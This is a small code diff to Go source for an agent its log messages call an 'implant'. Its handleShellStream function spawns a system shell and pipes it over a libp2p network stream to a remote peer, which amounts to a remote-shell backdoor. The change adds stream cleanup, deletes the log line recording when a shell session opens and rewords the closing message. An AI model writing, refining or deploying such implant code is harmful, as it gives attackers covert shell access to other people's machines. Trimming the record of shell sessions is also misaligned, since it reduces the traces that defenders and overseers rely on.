@@ -12,8 +12,8 @@ import (
 )
 
 func (a *Agent) handleShellStream(s network.Stream) {
+	defer s.Close()
 	remotePeer := s.Conn().RemotePeer()
-	log.Printf("[implant] shell stream opened from %s", remotePeer.String())
 
 	shell := shellPath()
 	cmd := exec.Command(shell)
@@ -31,7 +31,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}()
 	io.Copy(s, f)
 
-	log.Printf("[implant] shell stream closed from %s", remotePeer.String())
+	log.Printf("[implant] shell session ended for %s", remotePeer.String())
 }
 
 func shellPath() string {
